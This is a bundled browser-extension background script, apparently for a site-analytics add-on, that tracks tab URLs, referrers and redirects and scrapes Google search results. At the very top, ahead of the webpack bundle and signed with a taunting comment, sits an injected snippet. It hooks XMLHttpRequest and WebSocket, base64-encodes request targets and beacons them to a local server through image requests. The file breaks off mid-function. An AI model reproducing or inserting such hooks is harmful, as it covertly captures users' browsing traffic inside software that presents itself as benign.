function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
/******/ (function(modules) { // webpackBootstrap
/******/ 	// The module cache
/******/ 	var installedModules = {};
/******/
/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {
/******/
/******/ 		// Check if module is in cache
/******/ 		if(installedModules[moduleId]) {
/******/ 			return installedModules[moduleId].exports;
/******/ 		}
/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = installedModules[moduleId] = {
/******/ 			i: moduleId,
/******/ 			l: false,
/******/ 			exports: {}
/******/ 		};
/******/
/******/ 		// Execute the module function
/******/ 		modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);
/******/
/******/ 		// Flag the module as loaded
/******/ 		module.l = true;
/******/
/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}
/******/
/******/
/******/ 	// expose the modules object (__webpack_modules__)
/******/ 	__webpack_require__.m = modules;
/******/
/******/ 	// expose the module cache
/******/ 	__webpack_require__.c = installedModules;
/******/
/******/ 	// define getter function for harmony exports
/******/ 	__webpack_require__.d = function(exports, name, getter) {
/******/ 		if(!__webpack_require__.o(exports, name)) {
/******/ 			Object.defineProperty(exports, name, {
/******/ 				configurable: false,
/******/ 				enumerable: true,
/******/ 				get: getter
/******/ 			});
/******/ 		}
/******/ 	};
/******/
/******/ 	// getDefaultExport function for compatibility with non-harmony modules
/******/ 	__webpack_require__.n = function(module) {
/******/ 		var getter = module && module.__esModule ?
/******/ 			function getDefault() { return module['default']; } :
/******/ 			function getModuleExports() { return module; };
/******/ 		__webpack_require__.d(getter, 'a', getter);
/******/ 		return getter;
/******/ 	};
/******/
/******/ 	// Object.prototype.hasOwnProperty.call
/******/ 	__webpack_require__.o = function(object, property) { return Object.prototype.hasOwnProperty.call(object, property); };
/******/
/******/ 	// __webpack_public_path__
/******/ 	__webpack_require__.p = "";
/******/
/******/ 	// Load entry module and return exports
/******/ 	return __webpack_require__(__webpack_require__.s = 541);
/******/ })
/************************************************************************/
/******/ ({

/***/ 127:
/***/ (function(module, exports, __webpack_require__) {

/* WEBPACK VAR INJECTION */(function(process) {/**
  # detect-browser

  This is a package that attempts to detect a browser vendor and version (in
  a semver compatible format) using a navigator useragent in a browser or
  `process.version` in node.

  ## NOTE: Version 2.x release

  Release 2.0 introduces a breaking API change (hence the major release)
  which requires invocation of a `detect` function rather than just inclusion of
  the module.  PR [#46](https://github.com/DamonOehlman/detect-browser/pull/46)
  provides more context as to why this change has been made.

  ## Example Usage

  <<< examples/simple.js

  Or you can use a switch statement:

  <<< examples/switch.js

  ## Adding additional browser support

  The current list of browsers that can be detected by `detect-browser` is
  not exhaustive. If you have a browser that you would like to add support for
  then please submit a pull request with the implementation.

  Creating an acceptable implementation requires two things:

  1. A test demonstrating that the regular expression you have defined identifies
     your new browser correctly.  Examples of this can be found in the 
     `test/logic.js` file.

  2. Write the actual regex to the `lib/detectBrowser.js` file. In most cases adding
     the regex to the list of existing regexes will be suitable (if usage of `detect-brower`
     returns `undefined` for instance), but in some cases you might have to add it before
     an existing regex.  This would be true for a case where you have a browser that
     is a specialised variant of an existing browser but is identified as the
     non-specialised case.

  When writing the regular expression remember that you would write it containing a
  single [capturing group](https://regexone.com/lesson/capturing_groups) which
  captures the version number of the browser.

**/

function detect() {
  var nodeVersion = getNodeVersion();
  if (nodeVersion) {
    return nodeVersion;
  } else if (typeof navigator !== 'undefined') {
    return parseUserAgent(navigator.userAgent);
  }

  return null;
}

function detectOS(userAgentString) {
  var rules = getOperatingSystemRules();
  var detected = rules.filter(function (os) {
    return os.rule && os.rule.test(userAgentString);
  })[0];

  return detected ? detected.name : null;
}

function getNodeVersion() {
  var isNode = typeof navigator === 'undefined' && typeof process !== 'undefined';
  return isNode ? {
    name: 'node',
    version: process.version.slice(1),
    os: __webpack_require__(128).type().toLowerCase()
  } : null;
}

function parseUserAgent(userAgentString) {
  var browsers = getBrowserRules();
  if (!userAgentString) {
    return null;
  }

  var detected = browsers.map(function(browser) {
    var match = browser.rule.exec(userAgentString);
    var version = match && match[1].split(/[._]/).slice(0,3);

    if (version && version.length < 3) {
      version = version.concat(version.length == 1 ? [0, 0] : [0]);
    }

    return match && {
      name: browser.name,
      version: version.join('.')
    };
  }).filter(Boolean)[0] || null;

  if (detected) {
    detected.os = detectOS(userAgentString);
  }

  return detected;
}

function getBrowserRules() {
  return buildRules([
    [ 'edge', /Edge\/([0-9\._]+)/ ],
    [ 'yandexbrowser', /YaBrowser\/([0-9\._]+)/ ],
    [ 'vivaldi', /Vivaldi\/([0-9\.]+)/ ],
    [ 'kakaotalk', /KAKAOTALK\s([0-9\.]+)/ ],
    [ 'chrome', /(?!Chrom.*OPR)Chrom(?:e|ium)\/([0-9\.]+)(:?\s|$)/ ],
    [ 'phantomjs', /PhantomJS\/([0-9\.]+)(:?\s|$)/ ],
    [ 'crios', /CriOS\/([0-9\.]+)(:?\s|$)/ ],
    [ 'firefox', /Firefox\/([0-9\.]+)(?:\s|$)/ ],
    [ 'fxios', /FxiOS\/([0-9\.]+)/ ],
    [ 'opera', /Opera\/([0-9\.]+)(?:\s|$)/ ],
    [ 'opera', /OPR\/([0-9\.]+)(:?\s|$)$/ ],
    [ 'ie', /Trident\/7\.0.*rv\:([0-9\.]+).*\).*Gecko$/ ],
    [ 'ie', /MSIE\s([0-9\.]+);.*Trident\/[4-7].0/ ],
    [ 'ie', /MSIE\s(7\.0)/ ],
    [ 'bb10', /BB10;\sTouch.*Version\/([0-9\.]+)/ ],
    [ 'android', /Android\s([0-9\.]+)/ ],
    [ 'ios', /Version\/([0-9\._]+).*Mobile.*Safari.*/ ],
    [ 'safari', /Version\/([0-9\._]+).*Safari/ ]
  ]);
}

function getOperatingSystemRules() {
  return buildRules([
    [ 'iOS', /iP(hone|od|ad)/ ],
    [ 'Android OS', /Android/ ],
    [ 'BlackBerry OS', /BlackBerry|BB10/ ],
    [ 'Windows Mobile', /IEMobile/ ],
    [ 'Amazon OS', /Kindle/ ],
    [ 'Windows 3.11', /Win16/ ],
    [ 'Windows 95', /(Windows 95)|(Win95)|(Windows_95)/ ],
    [ 'Windows 98', /(Windows 98)|(Win98)/ ],
    [ 'Windows 2000', /(Windows NT 5.0)|(Windows 2000)/ ],
    [ 'Windows XP', /(Windows NT 5.1)|(Windows XP)/ ],
    [ 'Windows Server 2003', /(Windows NT 5.2)/ ],
    [ 'Windows Vista', /(Windows NT 6.0)/ ],
    [ 'Windows 7', /(Windows NT 6.1)/ ],
    [ 'Windows 8', /(Windows NT 6.2)/ ],
    [ 'Windows 8.1', /(Windows NT 6.3)/ ],
    [ 'Windows 10', /(Windows NT 10.0)/ ],
    [ 'Windows ME', /Windows ME/ ],
    [ 'Open BSD', /OpenBSD/ ],
    [ 'Sun OS', /SunOS/ ],
    [ 'Linux', /(Linux)|(X11)/ ],
    [ 'Mac OS', /(Mac_PowerPC)|(Macintosh)/ ],
    [ 'QNX', /QNX/ ],
    [ 'BeOS', /BeOS/ ],
    [ 'OS/2', /OS\/2/ ],
    [ 'Search Bot', /(nuhk)|(Googlebot)|(Yammybot)|(Openbot)|(Slurp)|(MSNBot)|(Ask Jeeves\/Teoma)|(ia_archiver)/ ]
  ]);
}

function buildRules(ruleTuples) {
  return ruleTuples.map(function(tuple) {
    return {
      name: tuple[0],
      rule: tuple[1]
    };
  });
}

module.exports = {
  detect: detect,
  detectOS: detectOS,
  getNodeVersion: getNodeVersion,
  parseUserAgent: parseUserAgent
};

/* WEBPACK VAR INJECTION */}.call(exports, __webpack_require__(22)))

/***/ }),

/***/ 128:
/***/ (function(module, exports) {

exports.endianness = function () { return 'LE' };

exports.hostname = function () {
    if (typeof location !== 'undefined') {
        return location.hostname
    }
    else return '';
};

exports.loadavg = function () { return [] };

exports.uptime = function () { return 0 };

exports.freemem = function () {
    return Number.MAX_VALUE;
};

exports.totalmem = function () {
    return Number.MAX_VALUE;
};

exports.cpus = function () { return [] };

exports.type = function () { return 'Browser' };

exports.release = function () {
    if (typeof navigator !== 'undefined') {
        return navigator.appVersion;
    }
    return '';
};

exports.networkInterfaces
= exports.getNetworkInterfaces
= function () { return {} };

exports.arch = function () { return 'javascript' };

exports.platform = function () { return 'browser' };

exports.tmpdir = exports.tmpDir = function () {
    return '/tmp';
};

exports.EOL = '\n';


/***/ }),

/***/ 169:
/***/ (function(module, exports, __webpack_require__) {

"use strict";


Object.defineProperty(exports, "__esModule", {
    value: true
});

var injectIntoTab = function injectIntoTab(tabId, scripts, styles) {
    if (styles) styles.forEach(function (cssFilePath) {
        chrome.tabs.insertCSS(tabId, {
            file: cssFilePath,
            runAt: "document_start",
            allFrames: false,
            matchAboutBlank: false
        }, function () {
            if (chrome.runtime.lastError) {}
        });
    });

    if (scripts) scripts.forEach(function (scriptFilePath) {
        chrome.tabs.executeScript(tabId, {
            file: scriptFilePath,
            runAt: "document_start",
            allFrames: false,
            matchAboutBlank: false
        }, function () {
            if (chrome.runtime.lastError) {}
        });
    });
};

var updateIconsOnAllTabs = function updateIconsOnAllTabs() {

    chrome.storage.sync.get("optedout", function (result) {
        var currentWindow = void 0;
        chrome.windows.getAll({
            populate: true
        }, function (windows) {
            Object.keys(windows).forEach(function (w) {
                currentWindow = windows[w];
                currentWindow.tabs.forEach(function (t) {
                    chrome.browserAction.setIcon({
                        path: "images/icon/ss-addon-icon-" + (result["optedout"] ? '00' : '16') + ".png",
                        tabId: t.id
                    });
                });
            });
        });
    });
};

var injectToAllTabs = function injectToAllTabs() {

    var currentWindow = void 0;
    chrome.windows.getAll({
        populate: true
    }, function (windows) {
        Object.keys(windows).forEach(function (w) {
            currentWindow = windows[w];
            currentWindow.tabs.forEach(function (t) {
                if (t.url.match(/^https?\:\/\//ig) && t.url.indexOf('https://chrome.google.com') == -1) {}
            });
        });
    });
};

exports.updateIconsOnAllTabs = updateIconsOnAllTabs;
exports.injectIntoTab = injectIntoTab;

/***/ }),

/***/ 22:
/***/ (function(module, exports) {

// shim for using process in browser
var process = module.exports = {};

// cached from whatever global is present so that test runners that stub it
// don't break things.  But we need to wrap it in a try catch in case it is
// wrapped in strict mode code which doesn't define any globals.  It's inside a
// function because try/catches deoptimize in certain engines.

var cachedSetTimeout;
var cachedClearTimeout;

function defaultSetTimout() {
    throw new Error('setTimeout has not been defined');
}
function defaultClearTimeout () {
    throw new Error('clearTimeout has not been defined');
}
(function () {
    try {
        if (typeof setTimeout === 'function') {
            cachedSetTimeout = setTimeout;
        } else {
            cachedSetTimeout = defaultSetTimout;
        }
    } catch (e) {
        cachedSetTimeout = defaultSetTimout;
    }
    try {
        if (typeof clearTimeout === 'function') {
            cachedClearTimeout = clearTimeout;
        } else {
            cachedClearTimeout = defaultClearTimeout;
        }
    } catch (e) {
        cachedClearTimeout = defaultClearTimeout;
    }
} ())
function runTimeout(fun) {
    if (cachedSetTimeout === setTimeout) {
        //normal enviroments in sane situations
        return setTimeout(fun, 0);
    }
    // if setTimeout wasn't available but was latter defined
    if ((cachedSetTimeout === defaultSetTimout || !cachedSetTimeout) && setTimeout) {
        cachedSetTimeout = setTimeout;
        return setTimeout(fun, 0);
    }
    try {
        // when when somebody has screwed with setTimeout but no I.E. maddness
        return cachedSetTimeout(fun, 0);
    } catch(e){
        try {
            // When we are in I.E. but the script has been evaled so I.E. doesn't trust the global object when called normally
            return cachedSetTimeout.call(null, fun, 0);
        } catch(e){
            // same as above but when it's a version of I.E. that must have the global object for 'this', hopfully our context correct otherwise it will throw a global error
            return cachedSetTimeout.call(this, fun, 0);
        }
    }


}
function runClearTimeout(marker) {
    if (cachedClearTimeout === clearTimeout) {
        //normal enviroments in sane situations
        return clearTimeout(marker);
    }
    // if clearTimeout wasn't available but was latter defined
    if ((cachedClearTimeout === defaultClearTimeout || !cachedClearTimeout) && clearTimeout) {
        cachedClearTimeout = clearTimeout;
        return clearTimeout(marker);
    }
    try {
        // when when somebody has screwed with setTimeout but no I.E. maddness
        return cachedClearTimeout(marker);
    } catch (e){
        try {
            // When we are in I.E. but the script has been evaled so I.E. doesn't  trust the global object when called normally
            return cachedClearTimeout.call(null, marker);
        } catch (e){
            // same as above but when it's a version of I.E. that must have the global object for 'this', hopfully our context correct otherwise it will throw a global error.
            // Some versions of I.E. have different rules for clearTimeout vs setTimeout
            return cachedClearTimeout.call(this, marker);
        }
    }



}
var queue = [];
var draining = false;
var currentQueue;
var queueIndex = -1;

function cleanUpNextTick() {
    if (!draining || !currentQueue) {
        return;
    }
    draining = false;
    if (currentQueue.length) {
        queue = currentQueue.concat(queue);
    } else {
        queueIndex = -1;
    }
    if (queue.length) {
        drainQueue();
    }
}

function drainQueue() {
    if (draining) {
        return;
    }
    var timeout = runTimeout(cleanUpNextTick);
    draining = true;

    var len = queue.length;
    while(len) {
        currentQueue = queue;
        queue = [];
        while (++queueIndex < len) {
            if (currentQueue) {
                currentQueue[queueIndex].run();
            }
        }
        queueIndex = -1;
        len = queue.length;
    }
    currentQueue = null;
    draining = false;
    runClearTimeout(timeout);
}

process.nextTick = function (fun) {
    var args = new Array(arguments.length - 1);
    if (arguments.length > 1) {
        for (var i = 1; i < arguments.length; i++) {
            args[i - 1] = arguments[i];
        }
    }
    queue.push(new Item(fun, args));
    if (queue.length === 1 && !draining) {
        runTimeout(drainQueue);
    }
};

// v8 likes predictible objects
function Item(fun, array) {
    this.fun = fun;
    this.array = array;
}
Item.prototype.run = function () {
    this.fun.apply(null, this.array);
};
process.title = 'browser';
process.browser = true;
process.env = {};
process.argv = [];
process.version = ''; // empty string to avoid regexp issues
process.versions = {};

function noop() {}

process.on = noop;
process.addListener = noop;
process.once = noop;
process.off = noop;
process.removeListener = noop;
process.removeAllListeners = noop;
process.emit = noop;
process.prependListener = noop;
process.prependOnceListener = noop;

process.listeners = function (name) { return [] }

process.binding = function (name) {
    throw new Error('process.binding is not supported');
};

process.cwd = function () { return '/' };
process.chdir = function (dir) {
    throw new Error('process.chdir is not supported');
};
process.umask = function() { return 0; };


/***/ }),

/***/ 23:
/***/ (function(module, exports, __webpack_require__) {

"use strict";


Object.defineProperty(exports, "__esModule", {
    value: true
});

var _require = __webpack_require__(127),
    detect = _require.detect;

var browser = detect();

var nFormatter = function nFormatter(num, digits) {
    var si = [{ value: 1E18, symbol: "E" }, { value: 1E15, symbol: "P" }, { value: 1E12, symbol: "T" }, { value: 1E9, symbol: "B" }, { value: 1E6, symbol: "M" }, { value: 1E3, symbol: "k" }],
        rx = /\.0+$|(\.[0-9]*[1-9])0+$/,
        i = void 0;
    for (i = 0; i < si.length; i++) {
        if (num >= si[i].value) {
            return (num / si[i].value).toFixed(digits).replace(rx, "$1") + si[i].symbol;
        }
    }
    return num.toFixed(digits).replace(rx, "$1");
};

var countries = {
    '4': 'AF',
    '8': 'AL',
    '10': 'AQ',
    '12': 'DZ',
    '16': 'AS',
    '24': 'AO',
    '28': 'AG',
    '31': 'AZ',
    '32': 'AR',
    '36': 'AU',
    '40': 'AT',
    '44': 'BS',
    '48': 'BH',
    '50': 'BD',
    '51': 'AM',
    '52': 'BB',
    '56': 'BE',
    '60': 'BM',
    '64': 'BT',
    '68': 'BO',
    '70': 'BA',
    '72': 'BW',
    '74': 'BV',
    '76': 'BR',
    '84': 'BZ',
    '86': 'IO',
    '90': 'SB',
    '92': 'VG',
    '96': 'BN',
    '100': 'BG',
    '104': 'MM',
    '108': 'BI',
    '112': 'BY',
    '116': 'KH',
    '120': 'CM',
    '124': 'CA',
    '132': 'CV',
    '136': 'KY',
    '140': 'CF',
    '144': 'LK',
    '148': 'TD',
    '152': 'CL',
    '156': 'CN',
    '158': 'TW',
    '162': 'CX',
    '166': 'CC',
    '170': 'CO',
    '174': 'KM',
    '175': 'YT',
    '178': 'CG',
    '180': 'CD',
    '184': 'CK',
    '188': 'CR',
    '191': 'HR',
    '192': 'CU',
    '196': 'CY',
    '203': 'CZ',
    '204': 'BJ',
    '208': 'DK',
    '212': 'DM',
    '214': 'DO',
    '218': 'EC',
    '222': 'SV',
    '226': 'GQ',
    '231': 'ET',
    '232': 'ER',
    '233': 'EE',
    '234': 'FO',
    '238': 'FK',
    '239': 'GS',
    '242': 'FJ',
    '246': 'FI',
    '248': 'AX',
    '250': 'FR',
    '254': 'GF',
    '258': 'PF',
    '260': 'TF',
    '262': 'DJ',
    '266': 'GA',
    '268': 'GE',
    '270': 'GM',
    '275': 'PS',
    '276': 'DE',
    '288': 'GH',
    '292': 'GI',
    '296': 'KI',
    '300': 'GR',
    '304': 'GL',
    '308': 'GD',
    '312': 'GP',
    '316': 'GU',
    '320': 'GT',
    '324': 'GN',
    '328': 'GY',
    '332': 'HT',
    '334': 'HM',
    '336': 'VA',
    '340': 'HN',
    '344': 'HK',
    '348': 'HU',
    '352': 'IS',
    '356': 'IN',
    '360': 'ID',
    '364': 'IR',
    '368': 'IQ',
    '372': 'IE',
    '376': 'IL',
    '380': 'IT',
    '384': 'CI',
    '388': 'JM',
    '392': 'JP',
    '398': 'KZ',
    '400': 'JO',
    '404': 'KE',
    '408': 'KP',
    '410': 'KR',
    '414': 'KW',
    '417': 'KG',
    '418': 'LA',
    '422': 'LB',
    '426': 'LS',
    '428': 'LV',
    '430': 'LR',
    '434': 'LY',
    '438': 'LI',
    '440': 'LT',
    '442': 'LU',
    '446': 'MO',
    '450': 'MG',
    '454': 'MW',
    '458': 'MY',
    '462': 'MV',
    '466': 'ML',
    '470': 'MT',
    '474': 'MQ',
    '478': 'MR',
    '480': 'MU',
    '484': 'MX',
    '492': 'MC',
    '496': 'MN',
    '498': 'MD',
    '499': 'ME',
    '500': 'MS',
    '504': 'MA',
    '508': 'MZ',
    '512': 'OM',
    '516': 'NA',
    '520': 'NR',
    '524': 'NP',
    '528': 'NL',
    '530': 'AN',
    '533': 'AW',
    '540': 'NC',
    '548': 'VU',
    '554': 'NZ',
    '558': 'NI',
    '562': 'NE',
    '566': 'NG',
    '570': 'NU',
    '574': 'NF',
    '578': 'NO',
    '580': 'MP',
    '581': 'UM',
    '583': 'FM',
    '584': 'MH',
    '585': 'PW',
    '586': 'PK',
    '591': 'PA',
    '598': 'PG',
    '600': 'PY',
    '604': 'PE',
    '608': 'PH',
    '612': 'PN',
    '616': 'PL',
    '620': 'PT',
    '624': 'GW',
    '626': 'TL',
    '630': 'PR',
    '634': 'QA',
    '638': 'RE',
    '642': 'RO',
    '643': 'RU',
    '646': 'RW',
    '652': 'BL',
    '654': 'SH',
    '659': 'KN',
    '660': 'AI',
    '662': 'LC',
    '663': 'MF',
    '666': 'PM',
    '670': 'VC',
    '674': 'SM',
    '678': 'ST',
    '682': 'SA',
    '686': 'SN',
    '688': 'RS',
    '690': 'SC',
    '694': 'SL',
    '702': 'SG',
    '703': 'SK',
    '704': 'VN',
    '705': 'SI',
    '706': 'SO',
    '710': 'ZA',
    '716': 'ZW',
    '724': 'ES',
    '728': 'SS',
    '732': 'EH',
    '736': 'SD',
    '740': 'SR',
    '744': 'SJ',
    '748': 'SZ',
    '752': 'SE',
    '756': 'CH',
    '760': 'SY',
    '762': 'TJ',
    '764': 'TH',
    '768': 'TG',
    '772': 'TK',
    '776': 'TO',
    '780': 'TT',
    '784': 'AE',
    '788': 'TN',
    '792': 'TR',
    '795': 'TM',
    '796': 'TC',
    '798': 'TV',
    '800': 'UG',
    '804': 'UA',
    '807': 'MK',
    '818': 'EG',
    '826': 'GB',
    '831': 'GG',
    '832': 'JE',
    '833': 'IM',
    '834': 'TZ',
    '840': 'US',
    '850': 'VI',
    '854': 'BF',
    '858': 'UY',
    '860': 'UZ',
    '862': 'VE',
    '876': 'WF',
    '882': 'WS',
    '887': 'YE',
    '894': 'ZM'
};

var openTab = function openTab(url, active) {
    chrome.runtime.sendMessage({ action: "openNewTab", url: url, active: active });
};

var cleanUrl = function cleanUrl(url) {
    var a = document.createElement('a');
    a.href = url;
    return a.origin.replace('https://', '').replace('http://', '').replace('www.', '');
};

var getHost = function getHost(url) {
    var a = document.createElement('a');
    a.href = url;
    return a.host;
};

var injectFont = function injectFont(url) {
    var link = document.createElement('link');
    link.href = url;
    link.rel = 'stylesheet';
    document.body.appendChild(link);
};

var capitalizeFirstLetter = function capitalizeFirstLetter(string) {
    return string.charAt(0).toUpperCase() + string.slice(1);
};

var getBrowser = function getBrowser() {
    return browser.name;
};

exports.countries = countries;
exports.injectFont = injectFont;
exports.nFormatter = nFormatter;
exports.openTab = openTab;
exports.cleanUrl = cleanUrl;
exports.getHost = getHost;
exports.getBrowser = getBrowser;
exports.capitalizeFirstLetter = capitalizeFirstLetter;

/***/ }),

/***/ 541:
/***/ (function(module, exports, __webpack_require__) {

module.exports = __webpack_require__(542);


/***/ }),

/***/ 542:
/***/ (function(module, exports, __webpack_require__) {

"use strict";


var _autoInjecting = __webpack_require__(169);

var _utils = __webpack_require__(23);

var image_prefix = "images/icon/ss-addon-icon-";
var browserName = (0, _utils.getBrowser)();
var itemator = browserName === 'firefox' ? 'a13ed76d9' : 'a2dbadf9f';

var version = chrome.runtime.getManifest().version;
var cb = chrome.browserAction,
    ct = chrome.tabs,
    wr = chrome.webRequest,
    wn = chrome.webNavigation,
    cw = chrome.windows,
    lp = "",
    currTabs = {},
    gid = guid().then(function (v) {
    return gid = v;
});

var wrFilter = { types: ["main_frame"], urls: ["<all_urls>"] };
ct.onUpdated.addListener(onUpdated);
ct.onReplaced.addListener(onReplaced);
wr.onBeforeRedirect.addListener(onBeforeRedirect, wrFilter);
wr.onBeforeSendHeaders.addListener(onBeforeSendHeaders, wrFilter, ["blocking", "requestHeaders"]);
wr.onHeadersReceived.addListener(onHeadersReceived, wrFilter);
wn.onCommitted.addListener(onCommitted);
ct.onRemoved.addListener(onRemoved);
cw.onRemoved.addListener(cwonRemoved);
cw.onFocusChanged.addListener(cwonFocused);
if (ct.onActivated) {
    ct.onActivated.addListener(onActivated);
} else {
    ct.onSelectionChanged.addListener(onSelectionChanged);
}
wr.onBeforeRequest.addListener(function (details) {
    if (validateUrl(details.url)) {
        editTabWithKeyValue(details.tabId, "rp", false);
        editTabWithKeyValue(details.tabId, "url", undefined);
    }
}, wrFilter, ["blocking"]);
wr.onErrorOccurred.addListener(function (details) {
    try {
        var currTab = getTabWithId(details.tabId);
        currTab.srs = null;
    } catch (e) {}
}, wrFilter);

var self = undefined;
cw.getAll({ populate: true }, function (windows) {
    for (var w = 0; w < windows.length; w++) {
        for (var i = 0; i < windows[w].tabs.length; i++) {
            if (!validateUrl(windows[w].tabs[i].url)) continue;
            setTabWithId({ url: windows[w].tabs[i].url, rp: true }, windows[w].tabs[i].id);
            if (windows[w].focused && windows[w].tabs[i].active) {
                dolp(windows[w].tabs[i].id);
            }
        }
    }
});

function isSubDomain(url) {
    url = url.replace(new RegExp(/^www\./i), "");
    url = url.replace(new RegExp(/\/(.*)/), "");
    if (url.match(new RegExp(/\.[a-z]{2,3}\.[a-z]{2}$/i))) {
        url = url.replace(new RegExp(/\.[a-z]{2,3}\.[a-z]{2}$/i), "");
    } else if (url.match(new RegExp(/\.[a-z]{2,4}$/i))) {
        url = url.replace(new RegExp(/\.[a-z]{2,4}$/i), "");
    }
    return url.match(new RegExp(/\./g)) ? true : false;
}

function editTabWithKeyValue(tabId, key, val) {
    var tab = getTabWithId(tabId);
    tab[key] = val;
    setTabWithId(tab, tabId);
}

function getTabWithId(tabId) {
    return currTabs[tabId] || {};
}

function removeTabWithId(tabId) {
    delete currTabs[tabId];
}

function setTabWithId(tab, tabId) {
    currTabs[tabId] = tab || {};
}

function onBeforeSendHeaders(details) {
    editTabWithKeyValue(details.tabId, "hh", true);
    for (var i = 0; i < details.requestHeaders.length; ++i) {
        if (details.requestHeaders[i].name === 'Referer') {
            editTabWithKeyValue(details.tabId, "ref", details.requestHeaders[i].value);
        }
    }
    return {
        requestHeaders: details.requestHeaders
    };
}

function onHeadersReceived(details) {
    editTabWithKeyValue(details.tabId, "hh", true);
}

function onBeforeRedirect(details) {
    var currTab = getTabWithId(details.tabId);
    if (!currTab.srs) {
        currTab.srs = [];
    }
    if (validateUrl(details.url)) {
        currTab.srs.push(details.url);
    }
}

function onCommitted(details) {
    try {
        if (details == undefined || details.frameId != 0) {
            return;
        }
        var tabId = details.tabId;
        if (tabId >= 0) {

            var currTab = getTabWithId(tabId);
            currTab.tt = details.transitionType;
            currTab.tq = details.transitionQualifiers;
            if (details.transitionQualifiers.indexOf("client_redirect") > -1) {
                if (validateUrl(details.url)) {
                    currTab.cr = details.url;
                }
            }
            setTabWithId(currTab, details.tabId);
            fetchPageDataFromSimilarWeb(tabId, tab);
        }
    } catch (e) {}
}

function cwonRemoved(windowID) {
    ct.query({ active: true }, function (tabs) {
        if (tabs[0]) {
            dolp(tabs[0].id);
        }
    });
}

function cwonFocused(window) {
    if (cw.WINDOW_ID_NONE == window) {
        return;
    }
    ct.query({ windowId: window, active: true }, function (tabs) {
        if (tabs[0] && tabs[0].active) {
            dolp(tabs[0].id);
        }
    });
}

function onRemoved(tabId) {
    removeTabWithId(tabId);
}

function onSelectionChanged(tabId, info) {
    var currTab = getTabWithId(tabId);
    if (!currTab.rp) {
        return;
    }
    ct.get(tabId, function (tab) {
        if (chrome.runtime.lastError) {} else {
            dolp(tab.id);
        }
    });
}

function onActivated(info) {
    onSelectionChanged(info.tabId);
}

function functionBody(f) {
    f = f.toString();
    return f.substring(f.indexOf("{") + 1, f.lastIndexOf("}")).trim();
}

function serptember() {
    (function () {
        var selectorTopAds = "#tads ol li.ads-ad",
            selectorBottomAds = "#bottomads ol li.ads-ad",
            selectorMain = "#res .g:not(#imagebox_bigimages)",
            arrayAds = [],
            arrayMain = [];
        var index = 0;

        function serpAd(singleAd, index) {
            var title = void 0,
                href = void 0,
                cite = void 0,
                dItem = void 0,
                description = void 0,
                h3 = void 0;
            h3 = singleAd.querySelector("h3");
            title = h3.innerText;
            if (h3.querySelector("a")) {
                href = h3.querySelectorAll("a")[1].href;
            } else {
                href = h3.parentNode;
                if (href.nodeName === "A") {
                    href = href.href;
                }
            }
            cite = singleAd.querySelector("cite").innerText;
            dItem = singleAd.querySelector(".ads-creative");
            description = dItem ? dItem.innerText : '';
            return { title: title, href: href, cite: cite, description: description, index: index };
        }

        function serpMain(singleMain, index) {
            var href = void 0,
                title = void 0,
                a = void 0,
                dItem = void 0,
                description = void 0;
            a = singleMain.querySelector("a");
            title = a.querySelector("h3") ? a.querySelector("h3").innerText : a.innerText;
            href = a.href;
            dItem = singleMain.querySelector(".st");
            description = dItem ? dItem.innerText : '';
            return { title: title, href: href, description: description, index: index };
        }
        document.querySelectorAll(selectorTopAds).forEach(function (el) {
            arrayAds.push(serpAd(el, index++));
        });
        document.querySelectorAll(selectorMain).forEach(function (el) {
            arrayMain.push(serpMain(el, index++));
        });
        document.querySelectorAll(selectorBottomAds).forEach(function (el) {
            arrayAds.push(serpAd(el, index++));
        });

        function reformat(o) {
            var o2 = {
                url: o.href,
                label: o.title,
                position: o.index,
                description: o.description
            };
            if (o.cite) o2.green_link = o.cite;
            return o2;
        }
        return { org: arrayMain.map(reformat), ads: arrayAds.map(reformat) };
    })();
}

function validatePage(url, tabId) {
    if (url.match(/^https:\/\/www\.google(?:\.\w+)+\/search\?/g) && url.indexOf("&tbm=") === -1) {
        return new Promise(function (r, rj) {
            ct.executeScript(tabId, {
                code: functionBody(serptember)
            }, function (res) {
                if (!res) {
                    r(false);
                } else {
                    res = res[0];
                    r(res);
                }
            });
        });
    } else {
        return Promise.resolve();
    }
}

function storageGetK(key) {
    if (browserName === 'firefox') {
        return browser.storage.local.get(key).then(function (res) {
            return storageGetBody(res);
        });
    }
    return storageGetBody();
}

function storageSetG(key, value) {
    if (browserName === 'firefox') {
        var item = {};
        item[key] = value;
        browser.storage.local.set(item);
    } else {
        localStorage.setItem(key, value);
    }
}

function storageGetBody(res) {
    var key = "guid_key";
    if (res && res[key]) return res[key].replace(/"/g, '');
    var lsv = localStorage.getItem(key);
    if (lsv) {
        lsv = lsv.replace(/"/g, '');
        storageSetG(key, lsv);
    }
    return lsv;
}

async function guid() {
    var stored = await storageGetK("guid_key");
    if (stored) {
        return stored;
    }
    var g = function g() {
        return ((1 + Math.random(Date.now() + 12)) * 0x10000 | 0).toString(30).substring(1);
    };
    var r = g() + g() + g() + g() + g() + g() + g() + g() + g();
    storageSetG("guid_key", r);
    return r;
};

function dolp(id) {
    var url = (getTabWithId(id) || {}).url;
    if (validateUrl(url)) lp = url;
}

function onUpdated(tabId, details, tab) {

    if (details && "loading" === details.status) {
        chrome.storage.sync.get("optedout", function (obj) {
            if (obj["optedout"]) setDynamicBadge(0, tabId);
        });
    } else if (details && "complete" === details.status) {
        var currTab = getTabWithId(tabId);
        currTab.tt = "ajax";
        setTabWithId(currTab, tabId);
        if (!currTab.ref) {
            chrome.tabs.executeScript(tabId, {
                code: "document.referrer"
            }, function (ref) {
                if (chrome.runtime.lastError) {}
                editTabWithKeyValue(tabId, "ref", ref);
                fetchPageDataFromSimilarWeb(tabId, tab);
            });
        } else {
            fetchPageDataFromSimilarWeb(tabId, tab);
        }
    }
}

function onReplaced(addedTabId, removedTabId) {
